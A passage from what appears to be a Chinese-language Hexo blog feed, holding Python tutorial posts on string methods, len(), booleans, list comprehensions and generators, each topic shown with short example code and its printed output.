<h5 id="4-常用的字符串方法"><a href="#4-常用的字符串方法" class="headerlink" title="4.常用的字符串方法"></a><font color="#00B2EE" face="Comic sans MS">4.常用的字符串方法</font></h5><h6 id="1-修改字符串的大小写"><a href="#1-修改字符串的大小写" class="headerlink" title="1. 修改字符串的大小写"></a><font color="#20B2AA" face="Comic sans MS">1. 修改字符串的大小写</font></h6><blockquote>
<p><font color="#FF7F00"><strong>使用方法：</strong></font></p>
</blockquote>
<ol>
<li>**upper()**：将字符串<font color="#FF7F00"><strong>所有字母大写</strong></font>；</li>
<li>**lower()**：将字符串<font color="#FF7F00"><strong>所有字母小写</strong></font>；</li>
<li>**title()**：将字符串<font color="#FF7F00"><strong>所有单词首字母大写，并将单词中除了首字母的变为小写</strong></font>。</li>
</ol>
<br>

<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Hexo lovelace giTHub toMMrow n&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name.upper())</span><br><span class="line"><span class="built_in">print</span>(name.lower())</span><br><span class="line"><span class="built_in">print</span>(name.title())</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">HEXO LOVELACE GITHUB TOMMROW N </span><br><span class="line">hexo lovelace github tommrow n </span><br><span class="line">Hexo Lovelace Github Tommrow N </span><br></pre></td></tr></table></figure>


<p><font face="Microsoft YaHei">在**<code>name.title()</code>** 中，name 后面的句点（ <strong><code>.</code></strong> ）让Python对变量name 执行方法title() 指定的操作。每个方法后面都跟着一对括号，这是因为方法通常需要<font color="#FF7F00"><strong>额外的信息来完成其工作</strong></font>。这种信息是在括号内提供的。函数title() 不需要额外的信息，因此它后面的括号是空的。</font></p>
<br>

<h6 id="2-暂时-x2F-永久删除字符串两端空白"><a href="#2-暂时-x2F-永久删除字符串两端空白" class="headerlink" title="2. 暂时&#x2F;永久删除字符串两端空白"></a><font color="#20B2AA" face="Comic sans MS">2. 暂时&#x2F;永久删除字符串两端空白</font></h6><blockquote>
<p><font color="#FF7F00"><strong>使用方法：</strong></font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei"><strong>strip()：</strong>删除字符串<font color="#FF7F00"><strong>两端</strong></font>空白或换行符；</font></li>
<li><font face="Microsoft YaHei"><strong>lstrip()：</strong>删除字符串<font color="#FF7F00"><strong>左</strong></font>端空白或换行符；</font></li>
<li><font face="Microsoft YaHei"><strong>rstrip()：</strong>删除字符串<font color="#FF7F00"><strong>右</strong></font>端空白或换行符；</font></li>
</ol>
<br>

<blockquote>
<p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>暂时</strong></font>或者是<font color="#FF7F00"><strong>永久</strong></font>删除的区别是在于调用方法后是否重新赋值给一个变量：</font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei"><strong>不赋值：</strong><font color="#FF7F00">暂时删除，下次调用时还是原字符串</font>；</font></li>
<li><font face="Microsoft YaHei"><strong>重新赋值：</strong><font color="#FF7F00">永久删除</font>。</font></li>
</ol>
<br>

<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;    HexoAndGithub  &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(name.strip())</span><br><span class="line"><span class="built_in">print</span>(name.rstrip())</span><br><span class="line"><span class="built_in">print</span>(name.lstrip())</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">name = name.strip()</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(name.strip())</span><br><span class="line"><span class="built_in">print</span>(name.rstrip())</span><br><span class="line"><span class="built_in">print</span>(name.lstrip())</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">    HexoAndGithub   </span><br><span class="line">HexoAndGithub </span><br><span class="line">    HexoAndGithub </span><br><span class="line">HexoAndGithub   </span><br><span class="line">    HexoAndGithub   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HexoAndGithub </span><br><span class="line">HexoAndGithub </span><br><span class="line">HexoAndGithub </span><br><span class="line">HexoAndGithub </span><br><span class="line">HexoAndGithub </span><br></pre></td></tr></table></figure>


<br>

<h6 id="3-内置函数-len-返回字符串长度"><a href="#3-内置函数-len-返回字符串长度" class="headerlink" title="3. 内置函数 len()返回字符串长度"></a><font color="#20B2AA" face="Comic sans MS">3. 内置函数 len()返回字符串长度</font></h6><p><font face="Microsoft YaHei">内置函数 len() 返回字符串长度，注意，它<strong>并不是字符串的方法！！！</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;supercalifragilisticexpialidocious&#x27;</span></span><br><span class="line">b = <span class="built_in">len</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">supercalifragilisticexpialidocious </span><br><span class="line"><span class="number">34</span> </span><br></pre></td></tr></table></figure>


<br>

<h4 id="3-4-布尔值"><a href="#3-4-布尔值" class="headerlink" title="3.4 布尔值"></a><font color="#3CB371" face="Comic sans MS">3.4 布尔值</font></h4><ol>
<li><p><font face="Microsoft YaHei">布尔值和布尔代数的表示完全一致，一个布尔值只有**<code>True</code><strong>、</strong><code>False</code>**两种值，要么是True，要么是False；</font></p>
</li>
<li><p><font face="Microsoft YaHei">在Python中，True、False<font color="#FF7F00"><strong>首字母必须大写</strong></font>。可以直接用True、False表示布尔值，请注意大小写，也可以通过布尔运算计算出来：</font></p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="literal">True</span></span><br><span class="line">b=<span class="number">3</span>&gt;<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">True</span> <span class="literal">True</span> </span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li><font face="Microsoft YaHei"><strong>布尔值可以用<code>and</code>、<code>or</code>和<code>not</code>运算</strong></font><ol>
<li><font face="Microsoft YaHei"><strong><code>and</code><strong>运算是</strong>与运算</strong>，只有<font color="#FF7F00"><strong>所有都为True，and运算结果才是True</strong></font> </font></li>
<li><font face="Microsoft YaHei"><strong><code>or</code><strong>运算是</strong>或运算</strong>，只要<font color="#FF7F00"><strong>其中有一个为True，or运算结果就是True</strong></font> </font></li>
<li><font face="Microsoft YaHei"><strong><code>not</code><strong>运算是</strong>非运算</strong>，它是一个单目运算符，<font color="#FF7F00"><strong>把True变成False，False变成True</strong></font> </font>s</li>
</ol>
</li>
</ol>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a= <span class="number">5</span> &gt; <span class="number">3</span> <span class="keyword">and</span> <span class="number">3</span> &lt; <span class="number">1</span></span><br><span class="line">b= <span class="number">5</span> &gt; <span class="number">3</span> <span class="keyword">or</span> <span class="number">1</span> &gt; <span class="number">3</span></span><br><span class="line">c= <span class="keyword">not</span> <span class="number">1</span> &gt; <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">False</span> </span><br><span class="line"><span class="literal">True</span> </span><br><span class="line"><span class="literal">True</span> </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-生成器与迭代器</title>
    <url>/post/Python-generator-iterator/</url>
    <content><![CDATA[<p>生成器生成想要的数据，可控制循环暂停，迭代器把可迭代的对象转换为生成器。( ⸝⸝⸝•_•⸝⸝⸝ )♡︎♡︎</p>
<span id="more"></span>

<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>生成器与迭代器</font> </center>

<br>

<br>


<h3 id="一-迭代、列表生成式"><a href="#一-迭代、列表生成式" class="headerlink" title="一. 迭代、列表生成式"></a><font color="#FF6347" face="Comic sans MS">一. 迭代、列表生成式</font></h3><h4 id="1-1-迭代"><a href="#1-1-迭代" class="headerlink" title="1.1 迭代"></a><font color="#3CB371" face="Comic sans MS">1.1 迭代</font></h4><p><font color="#FF7F00"><strong>迭代：</strong></font>如果给定一个list或tuple，我们可以通过for循环来遍历这个list或tuple，这种遍历我们称为迭代（Iteration）。<font color="#FF7F00"><strong>Python的for…in循环就是迭代</strong></font>。</p>
<p>list这种数据类型虽然有下标，但很多其他数据类型是没有下标的，但是，只要是可迭代对象，无论有无下标，都可以迭代，比如dict就可以迭代：</p>
<p><font color="#FF7F00"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d:</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<ol>
<li>因为dict、set的存储不是按照list的方式顺序排列，所以，迭代出的结果顺序很可能不一样。</li>
<li>默认情况下，dict迭代的是key。如果要迭代value，可以用<code>for value in d.values()</code>，如果要同时迭代key和value，可以用<code>for k, v in d.items()</code>。</li>
<li>当我们使用for循环时，只要作用于一个<font color="#FF7F00"><strong>可迭代对象</strong></font>，for循环就可以正常运行，而我们不太关心该对象究竟是list还是其他数据类型。</li>
</ol>
</blockquote>
<p>最后一个小问题，如果要对list实现类似Java那样的下标循环怎么办？<font color="#FF7F00"><strong>Python内置的enumerate函数可以把一个list变成索引-元素对</strong></font>，这样就可以在for循环中同时迭代索引和元素本身：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i, value <span class="keyword">in</span> <span class="built_in">enumerate</span>([<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>]):</span><br><span class="line">     <span class="built_in">print</span>(i, value)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">0</span> A</span><br><span class="line"><span class="number">1</span> B</span><br><span class="line"><span class="number">2</span> C</span><br></pre></td></tr></table></figure>

<br>

<br>

<h4 id="1-2-列表生成式"><a href="#1-2-列表生成式" class="headerlink" title="1.2 列表生成式"></a><font color="#3CB371" face="Comic sans MS">1.2 列表生成式</font></h4><p><strong>规则：</strong>for前面是一个表达式，表示将in后面的元素按照这个表达式进行计算出来后还要看in后面有没有筛选条件，<br>然后赋值给for…in中间的变量。格式如下：</p>
<p><font color="#FF7F00"><strong>表达式1 for 变量 in 可迭代对象 [表达式2]</strong></font></p>
<br>

<p>列表生成式即List Comprehensions，是Python内置的非常简单却强大的可以用来创建list的生成式。</p>
<p>举个例子，要生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]可以用<code>list(range(1, 11))</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">b = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>))	</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br></pre></td></tr></table></figure>

<br>

<p>但如果要生成[1x1, 2x2, 3x3, …, 10x10]怎么做？方法一是循环：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    L.append(x * x)</span><br><span class="line"><span class="built_in">print</span>(L)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure>

<br>

<p>但是循环太繁琐，而<font color="#FF7F00"><strong>列表生成式</strong></font>则可以用一行语句代替循环生成上面的list：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>)]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>前面是一个表达式，表示将<span class="keyword">in</span>后面的元素按照这个表达式进行计算出来后还要看<span class="keyword">in</span>后面有没有筛选条件，</span><br><span class="line">然后赋值给<span class="keyword">for</span>...<span class="keyword">in</span>中间的变量。格式如下：</span><br><span class="line"></span><br><span class="line">表达式<span class="number">1</span> <span class="keyword">for</span> 变量 <span class="keyword">in</span> 可迭代对象 [表达式<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> <span class="keyword">for</span>循环后面还可以加上<span class="keyword">if</span>判断，这样我们就可以筛选出仅偶数的平方：</span><br><span class="line"></span><br><span class="line">a = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="number">4</span>, <span class="number">16</span>, <span class="number">36</span>, <span class="number">64</span>, <span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 还可以使用两层循环，可以生成全排列：</span><br><span class="line"></span><br><span class="line">b = [m + n <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">&#x27;ABC&#x27;</span> <span class="keyword">for</span> n <span class="keyword">in</span> <span class="string">&#x27;XYZ&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;AX&#x27;</span>, <span class="string">&#x27;AY&#x27;</span>, <span class="string">&#x27;AZ&#x27;</span>, <span class="string">&#x27;BX&#x27;</span>, <span class="string">&#x27;BY&#x27;</span>, <span class="string">&#x27;BZ&#x27;</span>, <span class="string">&#x27;CX&#x27;</span>, <span class="string">&#x27;CY&#x27;</span>, <span class="string">&#x27;CZ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> <span class="keyword">for</span>循环其实可以同时使用两个甚至多个变量，比如<span class="built_in">dict</span>的items()可以同时迭代key和value：</span><br><span class="line"></span><br><span class="line">d = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;C&#x27;</span> &#125;</span><br><span class="line">a = [k + <span class="string">&#x27;=&#x27;</span> + v <span class="keyword">for</span> k, v <span class="keyword">in</span> d.items()]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;x=A&#x27;</span>, <span class="string">&#x27;y=B&#x27;</span>, <span class="string">&#x27;z=C&#x27;</span>]</span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="二-生成器"><a href="#二-生成器" class="headerlink" title="二. 生成器"></a><font color="#FF6347" face="Comic sans MS">二. 生成器</font></h3><p>参考资料：<br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.cnblogs.com/wj-1314/p/8490822.html#undefined">python 生成器和迭代器有这篇就够了</a>》</font><br></font><font face="Comic sans MS"><font color="#00B2EE">《<a href="http://www.runoob.com/python3/python3-iterator-generator.html">Python3 迭代器与生成器</a>》</font><br></font><font face="Comic sans MS"><font color="#00B2EE">《<a href="http://www.runoob.com/w3cnote/python-yield-used-analysis.html">Python yield 使用浅析</a>》</font><br></font></p>
<br>

<p><font color="#00B2EE"><strong>什么是生成器？</strong></font></p>
<p>　　通过列表生成式，我们可以直接创建一个列表，但是，受到内存限制，列表容量肯定是有限的，而且创建一个包含100万个元素的列表，不仅占用很大的存储空间，如果我们仅仅需要访问前面几个元素，那后面绝大多数元素占用的空间都白白浪费了。</p>
<p>　　所以，如果列表元素可以按照某种算法推算出来，那我们是否可以在循环的过程中不断推算出后续的元素呢？这样就不必创建完整的list，从而节省大量的空间，在Python中，这种一边循环一边计算的机制，称为<strong>生成器：generator</strong></p>
<p>　　生成器是一个特殊的程序，可以被用作控制循环的迭代行为，python中生成器是迭代器的一种，使用yield返回值函数，每次调用yield会暂停，而可以使用next()函数和send()函数恢复生成器。</p>
<p>　　生成器类似于返回值为数组的一个函数，这个函数可以接受参数，可以被调用，但是，不同于一般的函数会一次性返回包括了所有数值的数组，生成器一次只能产生一个值，这样消耗的内存数量将大大减小，而且允许调用函数可以很快的处理前几个返回值，因此生成器看起来像是一个函数，但是表现得却像是迭代器</p>
<br>

<blockquote>
<p><font color="#FF7F00"><strong>python提供了两种生成器基本的方式</strong></font><br><font color="#FF7F00"><strong>生成器函数：</strong></font>也是用def定义的，利用关键字yield一次返回一个结果、阻塞，重新开始<br><font color="#FF7F00"><strong>生成器表达式：</strong></font>返回一个对象，这个对象只有在需要的时候才产生结果</p>
</blockquote>
<br>

<br>

<h4 id="2-1-yield、-next-、send"><a href="#2-1-yield、-next-、send" class="headerlink" title="2.1 yield、__next__()、send()"></a><font color="#3CB371" face="Comic sans MS">2.1 yield、__next__()、send()</font></h4><br>

<ol>
<li><p>带有yield语句的函数不再是一个普通的函数，而是一个生成器generator，可用于迭代。</p>
</li>
<li><p>yield是一个类似return 的关键字，<font color="#FF7F00"><strong>返回一个值或者表达式</strong></font>，迭代一次遇到yield的时候就返回yield后面（代码块）或者右面（单行）的值，然后暂停。</p>
</li>
<li><p>一个函数正常执行遇到yeild时，<font color="#FF7F00"><strong>yeild返回一个值给函数的调用者，然后在这暂停并记住这个位置</strong></font>（因为此时程序要跳转到调用这个函数的地方 &#x3D;&gt; 因为yeild的返回）<font color="#FF7F00"><strong>！不去执行下一个语句的代码。当程序执行遇到__next__()方法或者next()（Python2用）时，继续执行上次yield的下一个语句直到遇到下一个yield或者该函数结束。</strong></font></p>
</li>
<li><p>send()和next()的区别就在于send可传递参数给yield表达式，这时候传递的参数就会作为yield表达式的值，而yield的参数是返回给调用者的值，也就是说send可以强行修改上一个yield表达式值。</p>
</li>
<li><p>send()和next()都有返回值，他们的返回值是当前迭代遇到的yield的时候，yield后面表达式的值，其实就是当前迭代yield后面的参数。</p>
</li>
<li><p><font color="#FF7F00"><strong>for…in 循环中会自动调用 next()</strong></font>。这就说明for…in能够不中断地执行完整个函数。</p>
</li>
</ol>
<br>

<p>下面举例子说明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">下面的例子用 a.__next__() 和 <span class="built_in">print</span>(<span class="built_in">next</span>(a)) 来说明yeild的返回和暂停</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">例<span class="number">1</span>：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;step 1&#x27;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;step 2&#x27;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;step 3&#x27;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line">a = odd()</span><br><span class="line">b = a.__next__()  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;*****分割线*****&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(b) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = a.__next__() </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;*****分割线*****&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(c) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：       </span><br><span class="line">step <span class="number">1</span></span><br><span class="line">*****分割线*****</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step <span class="number">2</span></span><br><span class="line">*****分割线*****</span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line">结论：这个时候在<span class="keyword">yield</span> <span class="number">1</span>处暂停了（输出step1），并且<span class="keyword">yield</span>返回了一个值<span class="number">1</span>给a.__next__() 。</span><br></pre></td></tr></table></figure>


<br>

<br>

<h4 id="2-2-表达式创建生成器"><a href="#2-2-表达式创建生成器" class="headerlink" title="2.2 表达式创建生成器"></a><font color="#3CB371" face="Comic sans MS">2.2 表达式创建生成器</font></h4><blockquote>
<p><font color="#FF7F00"><strong>generator保存的是算法，每次调用next(generaotr_ex)就计算出他的下一个元素的值，直到计算出最后一个元素，没有更多的元素时，抛出StopIteration的错误。</strong></font></p>
</blockquote>
<p>要创建一个generator，有很多种方法，第一种方法很简单，只有<font color="#FF7F00"><strong>把一个列表生成式的[]中括号改为（）小括号</strong></font>，就创建一个generator:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#列表生成式</span></span><br><span class="line">lis = [x*x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="built_in">print</span>(lis)</span><br><span class="line"><span class="comment">#生成器</span></span><br><span class="line">generator_ex = (x*x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(generator_ex)</span><br><span class="line"> </span><br><span class="line">结果：</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</span><br><span class="line">&lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x000002A4CBF9EBA0</span>&gt;</span><br></pre></td></tr></table></figure>

<br>

<p>　　那么创建lis和generator_ex，的区别是什么呢？从表面看就是[  ]和（）,但是结果却不一样，一个打印出来是列表（因为是列表生成式），而第二个打印出来却是&lt;generator object <genexpr> at 0x000002A4CBF9EBA0&gt;，那么如何打印出来generator_ex的每一个元素呢？</p>
<p>　　如果要一个个打印出来，可以通过 <code>__next__()</code> 获得generator的下一个返回值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成器</span></span><br><span class="line">generator_ex = (x*x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"><span class="built_in">print</span>(generator_ex.__next__())</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="number">36</span></span><br><span class="line"><span class="number">49</span></span><br><span class="line"><span class="number">64</span></span><br><span class="line"><span class="number">81</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;列表生成式.py&quot;</span>, line <span class="number">42</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">next</span>(generator_ex))</span><br><span class="line">StopIteration</span><br></pre></td></tr></table></figure>

<br>

<p><strong>generator保存的是算法，每次调用next(generaotr_ex)就计算出他的下一个元素的值，直到计算出最后一个元素，没有更多的元素时，抛出StopIteration的错误</strong>，而且上面这样不断调用是一个不好的习惯，正确的方法是使用for循环，因为generator也是可迭代对象。</p>
<p>所以我们创建一个generator后，基本上永远不会调用<code>__next__()</code>，而是通过for循环来迭代，并且不需要关心StopIteration的错误，generator非常强大，如果推算的算法比较复杂，用类似列表生成式的for循环无法实现的时候，还可以用函数来实现。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成器</span></span><br><span class="line">generator_ex = (x*x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> generator_ex:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">     </span><br><span class="line">结果：</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="number">36</span></span><br><span class="line"><span class="number">49</span></span><br><span class="line"><span class="number">64</span></span><br><span class="line"><span class="number">81</span></span><br></pre></td></tr></table></figure>


<br>

<br>

<h4 id="2-2-函数创建生成器"><a href="#2-2-函数创建生成器" class="headerlink" title="2.2 函数创建生成器"></a><font color="#3CB371" face="Comic sans MS">2.2 函数创建生成器</font></h4><blockquote>
<p><font color="#FF7F00"><strong>如果一个函数定义中包含yield关键字，那么这个函数就不再是一个普通函数，而是一个生成器。</strong></font></p>
</blockquote>
<br>

<p>下面举例子说明：</p>
<p>著名的斐波那契数列，除第一个和第二个数外，任何一个数都可以由前两个相加得到：</p>
<p>1，1，2，3，5，8，13，21，34…..</p>
<p>斐波那契数列用列表生成式写不出来，但是，用函数把它打印出来却很容易：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#fibonacci数列</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params"><span class="built_in">max</span></span>):</span></span><br><span class="line">    n,a,b =<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">max</span>:</span><br><span class="line">        a,b =b,a+b</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;done&#x27;</span></span><br><span class="line"> </span><br><span class="line">a = fib(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(fib(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<blockquote>
